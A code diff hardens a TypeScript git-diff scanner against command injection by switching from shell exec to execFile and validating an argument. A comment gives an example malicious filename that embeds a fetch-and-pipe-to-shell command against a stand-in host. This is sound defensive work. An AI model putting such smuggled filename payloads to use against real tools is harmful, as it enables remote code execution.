@@ -5,11 +5,15 @@
 
 import { readFile, stat, readdir } from 'fs/promises';
 import { join, relative } from 'path';
-import { exec } from 'child_process';
+import { execFile } from 'child_process';
 import { promisify } from 'util';
 import type { FileContent, FileScanMode, LineMapping } from './types.js';
 
-const execAsync = promisify(exec);
+// execFile spawns the binary directly with an argv array — no shell, no
+// metacharacter interpretation. Crucial when arguments come from filenames
+// (which can legally contain $, backticks, semicolons, etc.) or other
+// untrusted sources.
+const execFileAsync = promisify(execFile);
 
 /**
  * Error codes for file scanning
@@ -221,6 +225,12 @@ export async function getGitDiff(
   contextLines: number = 3
 ): Promise<string | null> {
   validateGitRef(gitRef);
+  if (!Number.isInteger(contextLines) || contextLines < 0 || contextLines > 10000) {
+    throw new FileScannerError(
+      FILE_SCANNER_ERROR_CODES.GIT_ERROR,
+      `Invalid contextLines: ${contextLines}`
+    );
+  }
 
   try {
     // Find git root from current directory
@@ -234,9 +244,12 @@ export async function getGitDiff(
     // Make filePath relative to git root for git command
     const relativeFilePath = relative(gitRoot, filePath);
 
-    // Run git diff from the repository root
-    const { stdout } = await execAsync(
-      `git diff -U${contextLines} ${gitRef} -- "${relativeFilePath}"`,
+    // Run git diff from the repository root via execFile (no shell) — a
+    // filename like `foo$(curl evil|sh).ts` is legal on disk and would
+    // execute through a shell-string exec.
+    const { stdout } = await execFileAsync(
+      'git',
+      ['diff', `-U${contextLines}`, gitRef, '--', relativeFilePath],
       { cwd: gitRoot }
     );
     return stdout;
@@ -364,8 +377,9 @@ export async function scanFileDiff(
  */
 async function findGitRoot(cwd: string): Promise<string | null> {
   try {
-    const { stdout } = await execAsync(
-      'git rev-parse --show-toplevel',
+    const { stdout } = await execFileAsync(
+      'git',
+      ['rev-parse', '--show-toplevel'],
       { cwd }
     );
     return stdout.trim();
@@ -394,9 +408,10 @@ export async function getChangedFiles(
       return [];
     }
 
-    // Run git diff from the repository root
-    const { stdout } = await execAsync(
-      `git diff --name-only ${gitRef}`,
+    // Run git diff from the repository root via execFile (no shell).
+    const { stdout } = await execFileAsync(
+      'git',
+      ['diff', '--name-only', gitRef],
       { cwd: gitRoot }
     );
 
